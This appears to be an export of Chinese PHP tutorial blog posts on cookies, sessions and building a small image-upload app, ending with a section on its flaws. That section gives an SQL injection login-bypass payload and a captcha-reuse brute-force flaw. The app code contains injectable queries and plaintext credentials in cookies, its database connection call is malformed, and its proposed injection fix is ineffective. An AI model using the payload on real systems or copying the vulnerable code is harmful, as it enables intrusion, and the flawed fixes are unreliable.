max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.193 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9x-forwarded-for: 127.0.0.1 响应第一次响应，服务端设置cookie并把cookie发送给客户端。 12345678910HTTP&#x2F;1.1 200 OKDate: Sat, 14 Nov 2020 03:11:10 GMTServer: ApacheX-Powered-By: PHP&#x2F;5.6.40Set-Cookie: username&#x3D;admin; expires&#x3D;Sat, 21-Nov-2020 03:11:10 GMT; Max-Age&#x3D;604800Set-Cookie: password&#x3D;123456; expires&#x3D;Sat, 21-Nov-2020 03:11:10 GMT; Max-Age&#x3D;604800Content-Length: 0Keep-Alive: timeout&#x3D;5, max&#x3D;100Connection: Keep-AliveContent-Type: text&#x2F;html; charset&#x3D;UTF-8 第二次访问请求第一次拿到了cookie，可以看到第二次访问服务端带上了cookie。 123456789101112131415GET &#x2F;php&#x2F;setcookie.php HTTP&#x2F;1.1Host: 127.0.0.1:8888Connection: keep-aliveCache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.193 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: username&#x3D;admin; password&#x3D;123456x-forwarded-for: 127.0.0.1 响应12345678910HTTP&#x2F;1.1 200 OKDate: Sat, 14 Nov 2020 03:14:34 GMTServer: ApacheX-Powered-By: PHP&#x2F;5.6.40Set-Cookie: username&#x3D;admin; expires&#x3D;Sat, 21-Nov-2020 03:14:34 GMT; Max-Age&#x3D;604800Set-Cookie: password&#x3D;123456; expires&#x3D;Sat, 21-Nov-2020 03:14:34 GMT; Max-Age&#x3D;604800Content-Length: 0Keep-Alive: timeout&#x3D;5, max&#x3D;100Connection: Keep-AliveContent-Type: text&#x2F;html; charset&#x3D;UTF-8 COOKIE设置COOKIE过期有效性设置即时性COOKIE设置描述：默认cookie的有效期是关闭浏览器时，自动失效。该cookie称为临时cookie； 语法：bool setcookie ( string $name , string $value [, int $expire = 0 ]) 参数：$expire可选，指定cookie保存的时间，默认为0，关闭浏览器失效； 有效性COOKIE设置语法： bool setcookie ( string $name , string $value [, int $expire = 0 ]) 参数：$expire可选，指定cookie保存的时间，默认为0，关闭浏览器失效； 说明：$expire为一个时间戳。一般用time()+N表示新的时间戳。在当前时间点，再加上N秒后，产生一个新的时间戳。 提示：一旦指定了有效的过期时间，cookie失效跟关闭浏览器无关(持久cookie)。 COOKIE路径有效性描述：设置COOKIE只能在指定的目录及其子目录下有效 语法：bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path]]] ) 参数：$path默认为&quot;/&quot;，代表当前网站根目录，在当前目录及其所有子目录都可以使用。 ü 说明：由于浏览器每次请求时，携带到服务器端很多的COOKIE数据，会导致请求数据变得庞大；将COOKIE划分到各个路径中，减少每个路径下COOKIE的数量。 例如：京东保存在客户端的有1万个COOKIE数据，大小为100MB，每次请求都需要1个小时。这样一来，每次请求带1个万COOKIE，但是当前页码只使用2个COOKIE，造成带宽浪费。 解决方案是：请求页面需要什么COOKIE，就带什么COOKIE过去，有针对性，会节省宽带。 setcookie.php 设置cookie只在某一文件下才有效。 12345&lt;?php//添加COOKIE数据setcookie(&quot;username&quot;,&quot;admin&quot;,time()+7*24*3600,&#x27;/steady&#x27;);setcookie(&quot;password&quot;,&quot;123456&quot;,time()+7*24*3600,&#x27;/steady&#x27;);?&gt; getcookie.php 123456&lt;?php//获取COOKIE中用户名和密码echo &quot;用户名：&quot;.$_COOKIE[&#x27;username&#x27;].&quot;&lt;br&gt;&quot;;echo &quot;密码：&quot;.$_COOKIE[&#x27;password&#x27;].&quot;&lt;hr&gt;&quot;;//打印$_COOKIE全局数组print_r($_COOKIE); 首先获取cookie http://127.0.0.1:8888/php/setcookie.php 然后访问别的页面查看是否有cookie输出 http://127.0.0.1:8888/php/getcookie.php 123用户名：密码：Array ( ) 访问指定的页面 http://127.0.0.1:8888/steady/getcookie.php 123用户名：admin密码：123456Array ( [username] &#x3D;&gt; admin [password] &#x3D;&gt; 123456 ) COOKIE域名有效性描述：给一个COOKIE指定访问的域名 语法：bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain]]]] ) 提示：默认情况下，cookie只能在当前域名下有效。 域名划分： 1234567主域名：itcast.cn一级域名：www.itcast.cn二级域名：news.itcast.cn三级域名：php.news.itcast.cn 说明：如果COOKIE域名有效性，设置为主域名，则在所有域名下都可以使用。如果设置为子域名，则只能在子域名下使用该COOKIE。 是否仅https安全连接才能发送cookie呢？描述：是否仅限https来发送COOKIE数据，默认情况下，为http协议发送； 语法：bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false]]]]] ) https：是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL 。 是否只能通过http协议来使用COOKIE呢？描述：客户端的COOKIE除了可以通过HTTP协议来使用外，还可以使用JS来使用COOKIE。 语法：bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] ) SESSION概述什么是SESSION？Session对象存储特定用户的会话数据； Session将会话数据存储在服务器端； Session是基于Cookie技术的，没有Cookie就没有Session； Session在整个用户会话中，一直存在下去； 一个用户会话时效：从用户登录开始，到用户登录结束； Session存储的数据量要比cookie大的多； Session存储的内容类型，不限于字符串； Session数据存储在服务器端，更安全，可靠。 开启SESSION会话功能ü 描述：启动新会话或者重用现有会话 ； 语法：bool session_start (void ) 提示：$_SESSION变量默认是不存在的，与$_POST、$_GET、$_FILES不一样。因此，必须先开启SESSION，才能使用$_SESSION变量； 提示：每个需要SESSION数据的页面，都要开启SESSION功能； 注意：SESSION功能，不能重复开启(同一个页面不能开2次)； 返回：成功开始会话返回 TRUE ，反之返回 FALSE； SESSION操作添加SESSION数据描述：对Session的管理(增删改查)，都是通过超全局数组$_SESSION进行的； 语法：$_SESSION[key] = value 提示：一个网站不管添加多少个SESSION数据，最终在浏览器端只存储一个SESSION的ID值，该ID值是经过加密的，并且永不重复。Key只能是String类型的数据。 SESSION文件在服务器端的存储位置：c:\\windows\\temp，查看session的文件存储位置，在phpinfo中查看session.save_path。 12345678&lt;?php&#x2F;&#x2F;开启SESSION会话&#x2F;&#x2F;产生新的SessionID或重用传递过来的SessionID&#x2F;&#x2F;产生SessionID，并创建对应的Session文件session_start();&#x2F;&#x2F;添加SESSION数据$_SESSION[&#39;username&#39;] &#x3D; &quot;admin&quot;;$_SESSION[&#39;password&#39;] &#x3D; &quot;123456&quot;; 读取SESSION数据语法：$value = $_SESSION[key] 提示：每次SESSION操作，都要先开SESSION功能； 12345678&lt;?php&#x2F;&#x2F;开启SESSION会话session_start();&#x2F;&#x2F;读取SESSION数据echo &quot;用户名：&quot;.$_SESSION[&#39;username&#39;].&quot;&lt;br&gt;&quot;;echo &quot;密码：&quot;.$_SESSION[&#39;password&#39;].&quot;&lt;hr&gt;&quot;;&#x2F;&#x2F;打印$_SESSION数组print_r($_SESSION); 删除SESSION数据123456789101112131415&lt;?php&#x2F;&#x2F;开启SESSION会话session_start();&#x2F;&#x2F;删除SESSION数据：也包括删除内存中的SESSION数据unset($_SESSION[&#39;username&#39;]);unset($_SESSION[&#39;password&#39;]);&#x2F;&#x2F;删除SESSION文件session_destroy();&#x2F;&#x2F;删除对应的SessIDsetcookie(&quot;PHPSESSID&quot;,false);&#x2F;&#x2F;打印$_SESSION数组print_r($_SESSION); 图片管理系统数据库创建数据库1mysql&gt; create database if not exists image charset utf8; 创建用户表12345mysql&gt; create table if not exists user( -&gt; id int not null auto_increment primary key, -&gt; username varchar(20), -&gt; password char(32) -&gt; )engine&#x3D;InnoDB; 1mysql&gt; insert into user(username,password) values(&quot;admin&quot;,&quot;admin&quot;); 创建相册数据库123456789mysql&gt; create table if not exists photos( -&gt; id int not null auto_increment primary key, -&gt; title varchar(20), -&gt; imgsrc varchar(100), -&gt; intro text, -&gt; hits int not null default 0, -&gt; addate int(10) -&gt; )engine&#x3D;InnoDB;Query OK, 0 rows affected (0.01 sec) 文件需求分析 用户登录之后，具有上传功能。 上传图片功能。 显示图片信息功能。 整体结构12345678910111213➜ xiangmu tree.├── app.php├── captcha.php├── conn.php├── detail.php├── index.php├── login.php├── loginSave.php├── upload.php└── uploadSave.php0 directories, 9 files 数据库1234567891011121314151617181920&lt;?php$db_name=&quot;image&quot;;$db_port=&quot;3306&quot;;$db_host=&quot;127.0.0.1&quot;;$db_user=&quot;root&quot;;$db_password=&quot;root&quot;;$bd_charset=&quot;utf-8&quot;;$link=@mysqli_connect($db_host.&quot;:&quot;.$db_port.$db_name,$db_password);if(!$link)&#123; echo &quot;数据库连接失败。&quot;; die();&#125;if(!mysqli_select_db($link,$db_name))&#123; echo &quot;数据库&#123;$db_name&#125;连接失败。&quot;;&#125;mysqli_set_charset($link,$bd_charset);?&gt; 登录功能提交表单给登录文件，登录文件判断提交的数据–用户名、密码、验证码是否合法。如果合法进入文件上传界面，如果不合法继续进入登录界面。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpsession_start();$_SESSION[&#x27;token&#x27;]=uniqid();?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;用户登录&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;/*全局样式*/body,h2,form,a&#123;margin:0px;padding:0px&#125;body&#123;font-size:14px;color:#444;background-color:#00343f;&#125;a&#123;text-decoration:none;color:#444;&#125;a:hover&#123;color:red;&#125; /*局部样式*/.box&#123;width:1000px;margin:0px auto;background-color:white;&#125;.title&#123; text-align:center; padding: 10px 0px; border-bottom: 2px solid #444; background-color:#d0e9ff;&#125;.title h2&#123;font-size:36px;padding:10px;&#125;form&#123;padding:30px;height:400px;&#125;form td&#123;padding:8px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt;&lt;!--title--&gt;&lt;div class=&quot;title&quot;&gt; &lt;h2&gt;用户登录&lt;/h2&gt; &lt;a href=&quot;javascript:void(0)&quot;&gt;欢迎光临，请先登录！&lt;/a&gt;&lt;/div&gt;&lt;!--//title--&gt;&lt;!--form--&gt;&lt;form method=&quot;post&quot; action=&quot;loginSave.php&quot;&gt;&lt;table align=&quot;center&quot; width=&quot;400&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot; align=&quot;right&quot;&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;right&quot;&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;right&quot;&gt;验证码：&lt;/td&gt; &lt;td&gt; &lt;input style=&quot;float:left;&quot; type=&quot;text&quot; name=&quot;verify&quot; size=&quot;4&quot; maxlength=&quot;4&quot;&gt; &lt;img style=&quot;float:left;margin-left:10px;cursor: pointer;height:22px;&quot; src=&quot;./captcha.php&quot; onClick=&quot;this.src=&#x27;./captcha.php?&#x27;+Math.random()&quot;&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $_SESSION[&#x27;token&#x27;]?&gt;&quot;&gt; &lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;!--//form--&gt;&lt;/div&gt;&lt;!--//box--&gt;&lt;/body&gt;&lt;/html&gt; 123456&lt;?php//开启SESSION会话session_start();//产生表单验证随机字符串$_SESSION[&#x27;token&#x27;] = uniqid();?&gt; 表单提交位置 1&lt;form method=&quot;post&quot; action=&quot;loginSave.php&quot;&gt; 表单随机验证 1&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $_SESSION[&#x27;token&#x27;]?&gt;&quot;&gt; 登录验证页面 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php//包含连接数据库的公共文件require_once(&quot;./conn.php&quot;);//开启SESSION会话session_start();//判断表单是否合法提交if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==$_SESSION[&#x27;token&#x27;])&#123; //获取表单提交数据 $username = $_POST[&#x27;username&#x27;]; //用户名 $password = md5($_POST[&#x27;password&#x27;]); //加密字符串 $verify = $_POST[&#x27;verify&#x27;]; //验证码 //判断验证码与服务器保存的是否一致：验证码不区分大小写 if(strtolower($verify) != $_SESSION[&#x27;captcha&#x27;]) &#123; echo &quot;&lt;h2&gt;两次输入的验证码不一致！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./login.php&quot;); die(); &#125; //判断用户名和密码与数据库是否一致 $sql = &quot;SELECT * FROM user WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;; $result = mysqli_query($link, $sql); //执行SQL语句，并返回结果集对象 $records = mysqli_num_rows($result); //取回记录数：0没找到，1找到了 if(!$records) &#123; echo &quot;&lt;h2&gt;用户名或密码不正确！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./login.php&quot;); die(); &#125; //保存用户信息到SESSION中 $_SESSION[&#x27;username&#x27;] = $username; //跳转到相册首页 header(&quot;location:./index.php&quot;);&#125;else&#123; //直接跳转到login.php header(&quot;location:./login.php&quot;);&#125; 后台文件上传功能1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?php//包含连接数据库的公共文件require_once(&quot;./conn.php&quot;);//开启SESSION会话session_start();//判断用户是否登录if(empty($_SESSION[&#x27;username&#x27;]))&#123; //如果用户没有登录，则直接跳转到login.php header(&quot;location:./login.php&quot;); die();&#125;//判断表单的来源是否合法if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==$_SESSION[&#x27;token&#x27;])&#123; //**********************上传图片******************************* //(1)判断上传图片是否有错误发生 if($_FILES[&#x27;uploadFile&#x27;][&#x27;error&#x27;]!=0) &#123; echo &quot;&lt;h2&gt;上传图片有错误发生！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./upload.php&quot;); die(); &#125; //(2)判断上传文件内容类型是不是图片 $arr1 = array(&quot;image/jpeg&quot;,&quot;image/png&quot;,&quot;image/gif&quot;); //创建finfo的资源：获取文件内容类型，与扩展名无关 $finfo = finfo_open(FILEINFO_MIME_TYPE); //获取文件内容的原始类型，不会随着扩展名改名而改变 $mime = finfo_file($finfo,$_FILES[&#x27;uploadFile&#x27;][&#x27;tmp_name&#x27;]); if(!in_array($mime,$arr1)) &#123; echo &quot;&lt;h2&gt;上传的必须是图像！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./upload.php&quot;); die(); &#125; //(3)判断上传的文件扩展名是不是图片 $arr2 = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;); $ext = pathinfo($_FILES[&#x27;uploadFile&#x27;][&#x27;name&#x27;],PATHINFO_EXTENSION); //文件扩展名 if(!in_array($ext,$arr2)) &#123; echo &quot;&lt;h2&gt;上传的必须是图像！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./upload.php&quot;); die(); &#125; //(4)移动图片到 images目录中 $tmp_name = $_FILES[&#x27;uploadFile&#x27;][&#x27;tmp_name&#x27;]; $dst_name = &quot;./images/&quot;.uniqid().&quot;.&quot;.$ext; move_uploaded_file($tmp_name,$dst_name); //***********************将表单提交数据保存到数据库**************************** //(1)获取表单提交数据 $title = $_POST[&#x27;title&#x27;]; $intro = $_POST[&#x27;intro&#x27;]; $imgsrc = $dst_name; //将图片路径保存到数据库 $addate = time(); //(2)判断记录是否添加成功 $sql = &quot;INSERT INTO photos VALUES(null,&#x27;$title&#x27;,&#x27;$imgsrc&#x27;,&#x27;$intro&#x27;,0,$addate)&quot;; if(mysqli_query($link, $sql)) &#123; echo &quot;&lt;h2&gt;上传照片成功！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./index.php&quot;); die(); &#125;&#125;else&#123; //直接跳转到index.php页面 header(&quot;location:./index.php&quot;);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?php//开启SESSION会话session_start();//判断用户是否登录if(empty($_SESSION[&#x27;username&#x27;]))&#123; //如果用户没有登录，则直接跳转到login.php header(&quot;location:./login.php&quot;); die();&#125;//产生表单验证随机字符串$_SESSION[&#x27;token&#x27;] = uniqid();?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;上传照片&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;/*全局样式*/body,h2,form,a&#123;margin:0px;padding:0px&#125;body&#123;font-size:14px;color:#444;background-color:#00343f;&#125;a&#123;text-decoration:none;color:#444;&#125;a:hover&#123;color:red;&#125; /*局部样式*/.box&#123;width:1000px;margin:0px auto;background-color:white;&#125;.title&#123; text-align:center; padding: 10px 0px; border-bottom: 2px solid #444; background-color:#d0e9ff;&#125;.title h2&#123;font-size:36px;padding:10px;&#125;form&#123;padding:30px;height:400px;&#125;form td&#123;padding:8px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt;&lt;!--title--&gt;&lt;div class=&quot;title&quot;&gt; &lt;h2&gt;上传照片&lt;/h2&gt; &lt;a href=&quot;./index.php&quot;&gt;返回首页&lt;/a&gt;&lt;/div&gt;&lt;!--//title--&gt;&lt;!--form--&gt;&lt;form method=&quot;post&quot; action=&quot;uploadSave.php&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;table align=&quot;center&quot; width=&quot;600&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot; align=&quot;right&quot;&gt;照片标题：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;title&quot; size=&quot;60&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;right&quot;&gt;上传照片：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;file&quot; name=&quot;uploadFile&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;right&quot;&gt;照片描述：&lt;/td&gt; &lt;td&gt;&lt;textarea name=&quot;intro&quot; cols=&quot;45&quot; rows=&quot;5&quot;&gt;&lt;/textarea&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $_SESSION[&#x27;token&#x27;]?&gt;&quot;&gt; &lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;!--//form--&gt;&lt;/div&gt;&lt;!--//box--&gt;&lt;/body&gt;&lt;/html&gt; 显示图片功能1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php//包含连接数据库的公共文件require_once(&quot;./conn.php&quot;);//开启SESSION会话session_start();//判断用户是否登录if(empty($_SESSION[&#x27;username&#x27;]))&#123; //如果用户没有登录，则直接跳转到login.php header(&quot;location:./login.php&quot;); die();&#125;//获取地址栏传递的id$id = $_GET[&#x27;id&#x27;];//更新访问量$sql = &quot;UPDATE photos SET hits=hits+1 WHERE id=$id&quot;;mysqli_query($link,$sql);//构建查询的SQL语句$sql = &quot;SELECT * FROM photos WHERE id=$id&quot;;//执行SQL语句，返回结果集对象$result = mysqli_query($link, $sql);//获取一行数据$arr = mysqli_fetch_assoc($result);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;照片详细信息&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;/*全局样式*/body,ul,li,h2,a&#123;margin:0px;padding:0px&#125;body&#123;font-size:14px;color:#444;background-color:#00343f;&#125;ul,li&#123;list-style: none;&#125;a&#123;text-decoration:none;color:#444;&#125;a:hover&#123;color:red;&#125; /*局部样式*/.box&#123;width:1000px;margin:0px auto;background-color:white;&#125;.title&#123; text-align:center; padding: 10px 0px; border-bottom: 2px solid #444; background-color:#d0e9ff;&#125;.title h2&#123;font-size:36px;padding:10px;&#125;.detail&#123;padding:15px 100px;&#125;.detail div&#123;text-align:center;&#125;.detail img&#123;width:640px;&#125;.detail p&#123;font-size:16px;text-indent: 36px; font-family: 微软雅黑;line-height: 28px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt;&lt;!--title--&gt;&lt;div class=&quot;title&quot;&gt; &lt;h2&gt;&lt;?php echo $arr[&#x27;title&#x27;]?&gt;&lt;/h2&gt; 访问&lt;font color=red&gt;&lt;?php echo $arr[&#x27;hits&#x27;]?&gt;&lt;/font&gt;次， 发布时间 &lt;font color=red&gt;&lt;?php echo date(&quot;Y-m-d H:i:s&quot;,$arr[&#x27;addate&#x27;])?&gt;&lt;/font&gt;， &lt;a href=&quot;./index.php&quot;&gt;返回首页&lt;/a&gt;&lt;/div&gt;&lt;!--//title--&gt;&lt;!--photos--&gt;&lt;div class=&quot;detail&quot;&gt; &lt;div class=&quot;photo&quot;&gt;&lt;img align=&quot;center&quot; src=&quot;&lt;?php echo $arr[&#x27;imgsrc&#x27;]?&gt;&quot;&gt;&lt;/div&gt; &lt;p&gt;&lt;?php echo $arr[&#x27;intro&#x27;]?&gt;&lt;/p&gt;&lt;/div&gt;&lt;!--//photos--&gt;&lt;/div&gt;&lt;!--//box--&gt;&lt;/body&gt;&lt;/html&gt; 验证码功能123456789101112//(1)产生4位随机验证码字符串$arr1 = array_merge(range(&#x27;a&#x27;,&#x27;z&#x27;),range(0,9),range(&#x27;A&#x27;,&#x27;Z&#x27;));shuffle($arr1);$arr2 = array_rand($arr1,4);$str = &quot;&quot;;foreach($arr2 as $index)&#123; $str .= $arr1[$index];&#125;//将验证码字符串保存到SESSION中session_start();$_SESSION[&#x27;captcha&#x27;] = strtolower($str); 漏洞挖掘sql注入漏洞登录处万能密码登录1admin&#39;# 后台语句 123$sql &#x3D; &quot;SELECT * FROM user WHERE username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;;$result &#x3D; mysqli_query($link, $sql); &#x2F;&#x2F;执行SQL语句，并返回结果集对象$records &#x3D; mysqli_num_rows($result); &#x2F;&#x2F;取回记录数：0没找到，1找到了 修复 对参数进行过滤，将账户和密码分离开验证。 123$sql &#x3D; &quot;SELECT password FROM user WHERE username&#x3D;&#39;admin&#39;&quot;;$result &#x3D; mysqli_query($link, $sql); &#x2F;&#x2F;执行SQL语句，并返回结果集对象$password2 &#x3D; mysqli_fetch_row($result); &#x2F;&#x2F;取回记录数：0没找到，1找到了 暴力破解登录页面可暴力破解 后台语句 123456789$sql = &quot;SELECT * FROM user WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;$result = mysqli_query($link, $sql); //执行SQL语句，并返回结果集对象$records = mysqli_num_rows($result); //取回记录数：0没找到，1找到了if(!$records)&#123; echo &quot;&lt;h2&gt;用户名或密码不正确！&lt;/h2&gt;&quot;; header(&quot;refresh:3;url=./login.php&quot;); die();&#125; 虽然有限制码限制，但是每次登录失败之后，session中的验证码没有及时的摧毁，导致验证码可以重复利用，进而导致账户密码可以暴力破解。 修复 在每次登录失败之后销毁cookie中的验证码。 1unset($_SESSION[&#39;captcha&#39;]);","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--核心编程2","slug":"PHP核心编程2","date":"2019-12-06T23:29:22.000Z","updated":"2020-11-15T09:23:11.967Z","comments":true,"path":"2019/12/07/PHP核心编程2/","link":"","permalink":"http://s1eady.top/2019/12/07/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B2/","excerpt":"","text":"PHP核心编程2PHP与文件上传upload.html 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;文件上传原理&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;form1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;upload.php&quot;&gt;上传图片1：&lt;input type=&quot;file&quot; name=&quot;uploadFile&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;upload&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload.php 1234567891011121314151617181920212223&lt;?php//判断表单是否合法提交if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==&#x27;upload&#x27;)&#123; print_r($_FILES); //将三维数组，转成二维数组 $arrs = $_FILES[&#x27;uploadFile&#x27;]; //循环判断，只需要移动有文件上传的 foreach($arrs[&#x27;name&#x27;] as $key=&gt;$name) &#123; //如果文件不则，则移动文件 if($name != &quot;&quot;) &#123; $ext = pathinfo($name,PATHINFO_EXTENSION); $tmp_name = $arrs[&#x27;tmp_name&#x27;][$key]; $dst_name = &quot;./upload/&quot;.uniqid().&quot;.&quot;.$ext; move_uploaded_file($tmp_name,$dst_name); &#125; &#125;&#125;else&#123; echo &quot;非法操作&quot;;&#125; 超全局变量数组 $_FILES$_POST数组中保存的是普通表单元素数据。 $_FILES数组中保存的是上传文件的信息。 1234567&lt;?php//判断表单是否合法提交if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==&#x27;upload&#x27;)&#123; print_r($_FILES);&#125;?&gt; 输出信息 123456789101112131415Array( [uploadFile] &#x3D;&gt; Array ( [name] &#x3D;&gt; 1.php [type] &#x3D;&gt; text&#x2F;php [tmp_name] &#x3D;&gt; &#x2F;Applications&#x2F;MAMP&#x2F;tmp&#x2F;php&#x2F;phpxc8lEX [error] &#x3D;&gt; 0 [size] &#x3D;&gt; 30 )) 分别是： 12345上传文件的原名称上传文件的类型上传文件数据的临时存放位置上传过程中是否发生错误上传文件的大小 上传文件错误代码 查看上传的临时文件位置上传文件的默认临时目录，如果没有指定php.ini配置项upload_tmp_dir的值，则使用操作系统临时目录(c:\\windows\\temp)。通过phpinfo()函数查看。在mac上的临时文件为： upload_tmp_dir /Applications/MAMP/tmp/php 为什么在 c:\\windows\\temp 中看不到上专文件呢？因为临时文件是短暂存在的，也就是在脚本执行完毕后，就消失了。 将上传文件移动到新位置描述：本函数检查并确保由 filename 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 destination 指定的文件。最好在临时文件没有消失前移动。 语法：bool move_uploaded_file ( string $filename , string $destination ) 参数：$filename，指定上传的临时文件名；$destination，指定新的文件名路径； 注意：如果文件已经存在，则会覆盖操作。 1234567891011&lt;?php//判断表单是否合法提交if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; $_POST[&#x27;token&#x27;]==&#x27;upload&#x27;)&#123; $tmp_name=$_FILES[&#x27;uploadFile&#x27;][&#x27;tmp_name&#x27;]; $dest_name=&quot;./upload/steady.php&quot;; move_uploaded_file($tmp_name,$dest_name);&#125;else&#123; echo &quot;文件上传不成功。&quot;;&#125;?&gt; 上传文件的相关配置(php.ini)upload_max_filesize配置：上传单个文件的大小限制，默认为2MB。 post_max_size配置：规定上传多个文件的总大小，默认为8MB。 max_file_uploads配置：规定最多上传的文件个数，默认为20个。 获取文件路径信息 pathinfo()描述：返回文件路径的信息 ; 语法：mixed pathinfo ( string $path [, int $options = PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME ] ) 